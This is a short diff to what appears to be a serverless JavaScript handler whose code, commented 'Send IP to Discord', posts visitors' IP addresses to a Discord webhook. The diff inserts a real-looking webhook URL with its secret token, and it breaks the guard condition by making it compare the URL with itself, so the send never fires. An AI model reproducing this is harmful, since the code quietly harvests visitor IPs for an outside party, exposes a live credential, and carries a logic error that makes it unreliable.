@@ -9,10 +9,10 @@ export default async function handler(request) {
 
         // Put your NEW Discord webhook between the quotes
         const webhook =
-            "PASTE_YOUR_NEW_DISCORD_WEBHOOK_HERE";
+            "https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW";
 
         // Send IP to Discord
-        if (webhook !== "PASTE_YOUR_NEW_DISCORD_WEBHOOK_HERE") {
+        if (webhook !== "https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW") {
             await fetch(webhook, {
                 method: "POST",
                 headers: {
